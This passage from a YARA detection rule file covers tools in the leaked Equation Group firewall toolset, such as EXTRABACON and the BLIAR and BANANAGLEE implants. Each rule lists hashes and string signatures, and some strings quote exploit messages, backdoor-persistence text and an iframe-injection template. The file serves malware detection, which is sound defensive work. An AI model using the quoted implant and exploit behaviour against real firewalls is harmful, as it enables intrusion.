license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ee266f84a1a4ccf2e789a73b0a11242223ed6eba6868875b5922aea931a2199c\"\n      tags = \"APT, DEMO, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cd /current/bin/FW/BANANAGLEE/$bgver/Install/LP/jetplow\" fullword ascii\n      $s2 = \"***** Please place your UA in /current/bin/FW/OPS *****\" fullword ascii\n      $s3 = \"ln -s ../jp/orig_code.bin orig_code_pixGen.bin\" fullword ascii\n      $s4 = \"*****             Welcome to JetPlow              *****\" fullword ascii\n   condition: \n      1 of them\n}\n\nrule APT_EQGRP_BBANJO_RID2BDF : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - file BBANJO-3011.exe\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 09:25:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f09c2f90464781a08436321f6549d350ecef3d92b4f25b95518760f5d4c9b2c3\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"get_lsl_interfaces\" fullword ascii\n      $s2 = \"encryptFC4Payload\" fullword ascii\n      $s3 = \".got_loader\" fullword ascii\n      $s4 = \"beacon_getconfig\" fullword ascii\n      $s5 = \"LOADED\" fullword ascii\n      $s6 = \"FormBeaconPacket\" fullword ascii\n      $s7 = \"beacon_reconfigure\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 50KB and all of them )\n}\n\nrule APT_EQGRP_BPATROL_2201_RID2D6B : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - file BPATROL-2201.exe\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 10:31:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"aa892750b893033eed2fedb2f4d872f79421174eb217f0c34a933c424ae66395\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"dumpConfig\" fullword ascii\n      $s2 = \"getstatusHandler\" fullword ascii\n      $s3 = \".got_loader\" fullword ascii\n      $s4 = \"xtractdata\" fullword ascii\n      $s5 = \"KEEPGOING\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 40KB and all of them )\n}\n\nrule APT_EQGRP_extrabacon_RID2E5A : APT DEMO SCRIPT {\n   meta:\n      description = \"EQGRP Toolset Firewall - file extrabacon_1.1.0.1.py\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 11:10:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"59d60835fe200515ece36a6e87e642ee8059a40cb04ba5f4b9cce7374a3e7735\"\n      tags = \"APT, DEMO, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"To disable password checking on target:\" fullword ascii\n      $x2 = \"[-] target is running\" fullword ascii\n      $x3 = \"[-] problem importing version-specific shellcode from\" fullword ascii\n      $x4 = \"[+] importing version-specific shellcode\" fullword ascii\n      $s5 = \"[-] unsupported target version, abort\" fullword ascii\n   condition: \n      1 of them\n}\n\nrule APT_EQGRP_sploit_py_RID2E16 : APT DEMO SCRIPT {\n   meta:\n      description = \"EQGRP Toolset Firewall - file sploit.py\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 10:59:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0316d70a5bbf068a7fc791e08e816015d04ec98f088a7ff42af8b9e769b8d1f6\"\n      tags = \"APT, DEMO, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"the --spoof option requires 3 or 4 fields as follows redir_ip\" ascii\n      $x2 = \"[-] timeout waiting for response - target may have crashed\" fullword ascii\n      $x3 = \"[-] no response from health check - target may have crashed\" fullword ascii\n   condition: \n      1 of them\n}\n\nrule APT_EQGRP_BICECREAM_RID2CAE : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - file BICECREAM-2140\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 09:59:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4842076af9ba49e6dfae21cf39847b4172c06a0bd3d2f1ca6f30622e14b77210\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Could not connect to target device: %s:%d. Please check IP address.\" fullword ascii\n      $s2 = \"command data size is invalid for an exec cmd\" fullword ascii\n      $s3 = \"A script was specified but target is not a PPC405-based NetScreen (NS5XT, NS25, and NS50). Executing scripts is supported but ma\" ascii\n      $s4 = \"Execute 0x%08x with args (%08x, %08x, %08x, %08x): [y/n]\" fullword ascii\n      $s5 = \"Execute 0x%08x with args (%08x, %08x, %08x): [y/n]\" fullword ascii\n      $s6 = \"[%d] Execute code.\" fullword ascii\n      $s7 = \"Execute 0x%08x with args (%08x): [y/n]\" fullword ascii\n      $s8 = \"dump_value_LHASH_DOALL_ARG\" fullword ascii\n      $s9 = \"Eggcode is complete. Pass execution to it? [y/n]\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 5000KB and 2 of them ) or ( 5 of them )\n}\n\nrule APT_EQGRP_create_http_injection_RID32E8 : APT DEMO FILE SCRIPT {\n   meta:\n      description = \"EQGRP Toolset Firewall - file create_http_injection.py\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 14:25:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"de52f5621b4f3896d4bd1fb93ee8be827e71a2b189a9f8552b68baed062a992d\"\n      tags = \"APT, DEMO, FILE, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"required by SECONDDATE\" fullword ascii\n      $s1 = \"help='Output file name (optional). By default the resulting data is written to stdout.')\" fullword ascii\n      $s2 = \"data = '<html><body onload=\\\"location.reload(true)\\\"><iframe src=\\\"%s\\\" height=\\\"1\\\" width=\\\"1\\\" scrolling=\\\"no\\\" frameborder=\\\"\" ascii\n      $s3 = \"version='%prog 1.0',\" fullword ascii\n      $s4 = \"usage='%prog [ ... options ... ] url',\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 3KB and ( $x1 or 2 of them ) ) or ( all of them )\n}\n\nrule APT_EQGRP_BFLEA_2201_RID2CB1 : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - file BFLEA-2201.exe\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 10:00:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"15e8c743770e44314496c5f27b6297c5d7a4af09404c4aa507757e0cc8edc79e\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".got_loader\" fullword ascii\n      $s2 = \"LOADED\" fullword ascii\n      $s3 = \"readFlashHandler\" fullword ascii\n      $s4 = \"KEEPGOING\" fullword ascii\n      $s5 = \"flashRtnsPix6x.c\" fullword ascii\n      $s6 = \"fix_ip_cksum_incr\" fullword ascii\n      $s7 = \"writeFlashHandler\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 30KB and 5 of them ) or ( all of them )\n}\n\nrule APT_EQGRP_BpfCreator_RHEL4_RID2FD9 : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - file BpfCreator-RHEL4\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 12:14:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"bd7303393409623cabf0fcf2127a0b81fae52fe40a0d2b8db0f9f092902bbd92\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"usage %s \\\"<tcpdump pcap string>\\\" <outfile>\" fullword ascii\n      $s2 = \"error reading dump file: %s\" fullword ascii\n      $s3 = \"truncated dump file; tried to read %u captured bytes, only got %lu\" fullword ascii\n      $s4 = \"%s: link-layer type %d isn't supported in savefiles\" fullword ascii\n      $s5 = \"DLT %d is not one of the DLTs supported by this device\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 2000KB and all of them )\n}\n\nrule APT_EQGRP_StoreFc_RID2CE9 : APT DEMO SCRIPT {\n   meta:\n      description = \"EQGRP Toolset Firewall - file StoreFc.py\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 10:09:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f155cce4eecff8598243a721389046ae2b6ca8ba6cb7b4ac00fd724601a56108\"\n      tags = \"APT, DEMO, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Usage: StoreFc.py --configFile=<path to xml file> --implantFile=<path to BinStore implant> [--outputFile=<file to write the conf\" ascii\n      $x2 = \"raise Exception, \\\"Must supply both a config file and implant file.\\\"\" fullword ascii\n      $x3 = \"This is wrapper for Store.py that FELONYCROWBAR will use. This\" fullword ascii\n   condition: \n      1 of them\n}\n\nrule APT_EQGRP_hexdump_RID2D2E : APT DEMO FILE SCRIPT {\n   meta:\n      description = \"EQGRP Toolset Firewall - file hexdump.py\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 10:20:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"95a9a6a8de60d3215c1c9f82d2d8b2640b42f5cabdc8b50bd1f4be2ea9d7575a\"\n      tags = \"APT, DEMO, FILE, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"def hexdump(x,lead=\\\"[+] \\\",out=sys.stdout):\" fullword ascii\n      $s2 = \"print >>out, \\\"%s%04x  \\\" % (lead,i),\" fullword ascii\n      $s3 = \"print >>out, \\\"%02X\\\" % ord(x[i+j]),\" fullword ascii\n      $s4 = \"print >>out, sane(x[i:i+16])\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 1KB and 2 of ( $s* ) ) or ( all of them )\n}\n\nrule APT_EQGRP_BBALL_RID2B90 : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - file BBALL_E28F6-2201.exe\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 09:11:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"498fc9f20b938b8111adfa3ca215325f265a08092eefd5300c4168876deb7bf6\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Components/Modules/BiosModule/Implant/E28F6/../e28f640j3_asm.S\" fullword ascii\n      $s2 = \".got_loader\" fullword ascii\n      $s3 = \"handler_readBIOS\" fullword ascii\n      $s4 = \"cmosReadByte\" fullword ascii\n      $s5 = \"KEEPGOING\" fullword ascii\n      $s6 = \"checksumAreaConfirmed.0\" fullword ascii\n      $s7 = \"writeSpeedPlow.c\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 40KB and 4 of ( $s* ) ) or ( all of them )\n}\n\nrule APT_EQGRP_BARPUNCH_BPICKER_RID2EE5 : APT DEMO FILE T1083 {\n   meta:\n      description = \"EQGRP Toolset Firewall - from files BARPUNCH-3110, BPICKER-3100\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 11:34:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"830538fe8c981ca386c6c7d55635ac61161b23e6e25d96280ac2fc638c2d82cc\"\n      hash2 = \"d859ce034751cac960825268a157ced7c7001d553b03aec54e6794ff66185e6f\"\n      tags = \"APT, DEMO, FILE, T1083\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"--cmd %x --idkey %s --sport %i --dport %i --lp %s --implant %s --bsize %hu --logdir %s --lptimeout %u\" fullword ascii\n      $x2 = \"%s -c <cmdtype> -l <lp> -i <implant> -k <ikey> -s <port> -d <port> [operation] [options]\" fullword ascii\n      $x3 = \"* [%lu] 0x%x is marked as stateless (the module will be persisted without its configuration)\" fullword ascii\n      $x4 = \"%s version %s already has persistence installed. If you want to uninstall,\" fullword ascii\n      $x5 = \"The active module(s) on the target are not meant to be persisted\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 6000KB and 1 of them ) or ( 3 of them )\n}\n\nrule APT_EQGRP_Implants_Gen6_RID2F2A : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - from files BananaUsurper-2120, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, BPICKER-3100, writeJetPlow-2130\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 11:45:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3366b4bbf265716869a487203a8ac39867920880990493dd4dd8385e42b0c119\"\n      hash2 = \"05031898f3d52a5e05de119868c0ec7caad3c9f3e9780e12f6f28b02941895a4\"\n      hash3 = \"d9756e3ba272cd4502d88f4520747e9e69d241dee6561f30423840123c1a7939\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"LP.c:pixSecurity - Improper number of bytes read in Security/Interface Information\" fullword ascii\n      $s2 = \"LP.c:pixSecurity - Not in Session\" fullword ascii\n      $s3 = \"getModInterface__preloadedModules\" fullword ascii\n      $s4 = \"showCommands\" fullword ascii\n      $s5 = \"readModuleInterface\" fullword ascii\n      $s6 = \"Wrapping_Not_Necessary_Or_Wrapping_Ok\" fullword ascii\n      $s7 = \"Get_CMD_List\" fullword ascii\n      $s8 = \"LP_Listen2\" fullword ascii\n      $s9 = \"killCmdList\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 6000KB and all of them )\n}\n\nrule APT_EQGRP_Implants_Gen5_RID2F29 : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - from files BananaUsurper-2120, BARPUNCH-3110, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, BPICKER-3100, writeJetPlow-2130\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 11:45:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3366b4bbf265716869a487203a8ac39867920880990493dd4dd8385e42b0c119\"\n      hash2 = \"830538fe8c981ca386c6c7d55635ac61161b23e6e25d96280ac2fc638c2d82cc\"\n      hash3 = \"05031898f3d52a5e05de119868c0ec7caad3c9f3e9780e12f6f28b02941895a4\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Module and Implant versions do not match.  This module is not compatible with the target implant\" fullword ascii\n      $s1 = \"%s/BF_READ_%08x_%04d%02d%02d_%02d%02d%02d.log\" fullword ascii\n      $s2 = \"%s/BF_%04d%02d%02d.log\" fullword ascii\n      $s3 = \"%s/BF_READ_%08x_%04d%02d%02d_%02d%02d%02d.bin\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and 1 of ( $x* ) ) or ( all of them )\n}\n\nrule APT_EQGRP_pandarock_RID2DE6 : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - from files pandarock_v1.11.1.1.bin, pit\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 10:51:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"1214e282ac7258e616ebd76f912d4b2455d1b415b7216823caa3fc0d09045a5f\"\n      hash2 = \"c8a151df7605cb48feb8be2ab43ec965b561d2b6e2a837d645fdf6a6191ab5fe\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"* Not attempting to execute \\\"%s\\\" command\" fullword ascii\n      $x2 = \"TERMINATING SCRIPT (command error or \\\"quit\\\" encountered)\" fullword ascii\n      $x3 = \"execute code in <file> passing <argX> (HEX)\" fullword ascii\n      $x4 = \"* Use arrow keys to scroll through command history\" fullword ascii\n      $s1 = \"pitCmd_processCmdLine\" fullword ascii\n      $s2 = \"execute all commands in <file>\" fullword ascii\n      $s3 = \"__processShellCmd\" ascii\n      $s4 = \"pitTarget_getDstPort\" fullword ascii\n      $s5 = \"__processSetTargetIp\" ascii\n      $o1 = \"Logging commands and output - ON\" fullword ascii\n      $o2 = \"This command is too dangerous.  If you'd like to run it, contact the development team\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 3000KB and 1 of ( $x* ) ) or ( 4 of them ) or 1 of ( $o* )\n}\n\nrule APT_EQGRP_BananaUsurper_writeJetPlow_RID34B9 : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - from files BananaUsurper-2120, writeJetPlow-2130\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 15:42:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3366b4bbf265716869a487203a8ac39867920880990493dd4dd8385e42b0c119\"\n      hash2 = \"464b4c01f93f31500d2d770360d23bdc37e5ad4885e274a629ea86b2accb7a5c\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Implant Version-Specific Values:\" fullword ascii\n      $x2 = \"This function should not be used with a Netscreen, something has gone horribly wrong\" fullword ascii\n      $s1 = \"createSendRecv: recv'd an error from the target.\" fullword ascii\n      $s2 = \"Error: WatchDogTimeout read returned %d instead of 4\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 2000KB and 1 of ( $x* ) ) or ( 3 of them )\n}\n\nrule APT_EQGRP_Implants_Gen4_RID2F28 : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - from files BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 11:45:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"05031898f3d52a5e05de119868c0ec7caad3c9f3e9780e12f6f28b02941895a4\"\n      hash2 = \"d9756e3ba272cd4502d88f4520747e9e69d241dee6561f30423840123c1a7939\"\n      hash3 = \"8e4a76c4b50350b67cabbb2fed47d781ee52d8d21121647b0c0356498aeda2a2\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Command has not yet been coded\" fullword ascii\n      $s2 = \"Beacon Domain  : www.%s.com\" fullword ascii\n      $s3 = \"This command can only be run on a PIX/ASA\" fullword ascii\n      $s4 = \"Warning! Bad or missing Flash values (in section 2 of .dat file)\" fullword ascii\n      $s5 = \"Printing the interface info and security levels. PIX ONLY.\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 3000KB and 3 of them ) or ( all of them )\n}\n\nrule APT_EQGRP_Implants_Gen3_RID2F27 : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - from files BARPUNCH-3110, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, BPICKER-3100\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 11:45:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"830538fe8c981ca386c6c7d55635ac61161b23e6e25d96280ac2fc638c2d82cc\"\n      hash2 = \"05031898f3d52a5e05de119868c0ec7caad3c9f3e9780e12f6f28b02941895a4\"\n      hash3 = \"d9756e3ba272cd4502d88f4520747e9e69d241dee6561f30423840123c1a7939\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"incomplete and must be removed manually.)\" fullword ascii\n      $s1 = \"%s: recv'd an error from the target.\" fullword ascii\n      $s2 = \"Unable to fetch the address to the get_uptime_secs function for this OS version\" fullword ascii\n      $s3 = \"upload/activate/de-activate/remove/cmd function failed\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 6000KB and 2 of them ) or ( all of them )\n}\n\nrule APT_EQGRP_BLIAR_BLIQUER_RID2E10 : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - from files BLIAR-2110, BLIQUER-2230\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 10:58:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"05031898f3d52a5e05de119868c0ec7caad3c9f3e9780e12f6f28b02941895a4\"\n      hash2 = \"d9756e3ba272cd4502d88f4520747e9e69d241dee6561f30423840123c1a7939\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Do you wish to activate the implant that is already on the firewall? (y/n): \" fullword ascii\n      $x2 = \"There is no implant present on the firewall.\" fullword ascii\n      $x3 = \"Implant Version :%lx%lx%lx\" fullword ascii\n      $x4 = \"You may now connect to the implant using the pbd idkey\" fullword ascii\n      $x5 = \"No reply from persistant back door.\" fullword ascii\n      $x6 = \"rm -rf pbd.wc; wc -c %s > pbd.wc\" fullword ascii\n      $p1 = \"PBD_GetVersion\" fullword ascii\n      $p2 = \"pbd/pbdEncrypt.bin\" fullword ascii\n      $p3 = \"pbd/pbdGetVersion.pkt\" fullword ascii\n      $p4 = \"pbd/pbdStartWrite.bin\" fullword ascii\n      $p5 = \"pbd/pbd_setNewHookPt.pkt\" fullword ascii\n      $p6 = \"pbd/pbd_Upload_SinglePkt.pkt\" fullword ascii\n      $s1 = \"Unable to fetch hook and jmp addresses for this OS version\" fullword ascii\n      $s2 = \"Could not get hook and jump addresses\" fullword ascii\n      $s3 = \"Enter the name of a clean implant binary (NOT an image):\" fullword ascii\n      $s4 = \"Unable to read dat file for OS version 0x%08lx\" fullword ascii\n      $s5 = \"Invalid implant file\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 3000KB and ( 1 of ( $x* ) or 1 of ( $p* ) ) ) or ( 3 of them )\n}\n\nrule APT_EQGRP_sploit_RID2CCE : APT DEMO FILE SCRIPT {\n   meta:\n      description = \"EQGRP Toolset Firewall - from files sploit.py, sploit.py\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 10:04:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0316d70a5bbf068a7fc791e08e816015d04ec98f088a7ff42af8b9e769b8d1f6\"\n      tags = \"APT, DEMO, FILE, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"print \\\"[+] Connecting to %s:%s\\\" % (self.params.dst['ip'], self.params.dst['port'])\" fullword ascii\n      $s2 = \"@overridable(\\\"Must be overriden if the target will be touched.  Base implementation should not be called.\\\")\" fullword ascii\n      $s3 = \"@overridable(\\\"Must be overriden.  Base implementation should not be called.\\\")\" fullword ascii\n      $s4 = \"exp.load_vinfo()\" fullword ascii\n      $s5 = \"if not okay and self.terminateFlingOnException:\" fullword ascii\n      $s6 = \"print \\\"[-] keyboard interrupt before response received\\\"\" fullword ascii\n      $s7 = \"if self.terminateFlingOnException:\" fullword ascii\n      $s8 = \"print 'Debug info ','='*40\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 90KB and 1 of ( $s* ) ) or ( 4 of them )\n}\n\nrule APT_EQGRP_Implants_Gen2_RID2F26 : APT DEMO FILE T1083 {\n   meta:\n      description = \"EQGRP Toolset Firewall - from files BananaUsurper-2120, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, writeJetPlow-2130\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 11:44:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3366b4bbf265716869a487203a8ac39867920880990493dd4dd8385e42b0c119\"\n      hash2 = \"05031898f3d52a5e05de119868c0ec7caad3c9f3e9780e12f6f28b02941895a4\"\n      hash3 = \"d9756e3ba272cd4502d88f4520747e9e69d241dee6561f30423840123c1a7939\"\n      tags = \"APT, DEMO, FILE, T1083\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Modules persistence file written successfully\" fullword ascii\n      $x2 = \"Modules persistence data successfully removed\" fullword ascii\n      $x3 = \"No Modules are active on the firewall, nothing to persist\" fullword ascii\n      $s1 = \"--cmd %x --idkey %s --sport %i --dport %i --lp %s --implant %s --bsize %hu --logdir %s \" fullword ascii\n      $s2 = \"Error while attemping to persist modules:\" fullword ascii\n      $s3 = \"Error while reading interface info from PIX\" fullword ascii\n      $s4 = \"LP.c:pixFree - Failed to get response\" fullword ascii\n      $s5 = \"WARNING: LP Timeout specified (%lu seconds) less than default (%u seconds).  Setting default\" fullword ascii\n      $s6 = \"Unable to fetch config address for this OS version\" fullword ascii\n      $s7 = \"LP.c: interface information not available for this session\" fullword ascii\n      $s8 = \"[%s:%s:%d] ERROR: \" fullword ascii\n      $s9 = \"extract_fgbg\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 3000KB and 1 of ( $x* ) ) or ( 5 of them )\n}\n\nrule APT_EQGRP_Implants_Gen1_RID2F25 : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - from files BananaUsurper-2120, BARPUNCH-3110, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, BPICKER-3100, lpexe, writeJetPlow-2130\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 11:44:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3366b4bbf265716869a487203a8ac39867920880990493dd4dd8385e42b0c119\"\n      hash2 = \"830538fe8c981ca386c6c7d55635ac61161b23e6e25d96280ac2fc638c2d82cc\"\n      hash3 = \"05031898f3d52a5e05de119868c0ec7caad3c9f3e9780e12f6f28b02941895a4\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"WARNING:  Session may not have been closed!\" fullword ascii\n      $s2 = \"EXEC Packet Processed\" fullword ascii\n      $s3 = \"Failed to insert the command into command list.\" fullword ascii\n      $s4 = \"Send_Packet: Trying to send too much data.\" fullword ascii\n      $s5 = \"payloadLength >= MAX_ALLOW_SIZE.\" fullword ascii\n      $s6 = \"Wrong Payload Size\" fullword ascii\n      $s7 = \"Unknown packet received......\" fullword ascii\n      $s8 = \"Returned eax = %08x\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 6000KB and ( 2 of ( $s* ) ) ) or ( 5 of them )\n}\n\nrule APT_EQGRP_eligiblebombshell_generic_RID3464 : APT DEMO GEN SCRIPT {\n   meta:\n      description = \"EQGRP Toolset Firewall - from files eligiblebombshell_1.2.0.1.py, eligiblebombshell_1.2.0.1.py\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 15:28:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"dd0e3ae6e1039a755bf6cb28bf726b4d6ab4a1da2392ba66d114a43a55491eb1\"\n      tags = \"APT, DEMO, GEN, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"logging.error(\\\"       Perhaps you should run with --scan?\\\")\" fullword ascii\n      $s2 = \"logging.error(\\\"ERROR: No entry for ETag [%s] in %s.\\\" %\" fullword ascii\n      $s3 = \"\\\"be supplied\\\")\" fullword ascii\n   condition: \n      ( filesize < 70KB and 2 of ( $s* ) ) or ( all of them )\n}\n\nrule APT_EQGRP_ssh_telnet_29_RID2F36 : APT DEMO SCRIPT T1021_004 {\n   meta:\n      description = \"EQGRP Toolset Firewall - from files ssh.py, telnet.py\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 11:47:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC 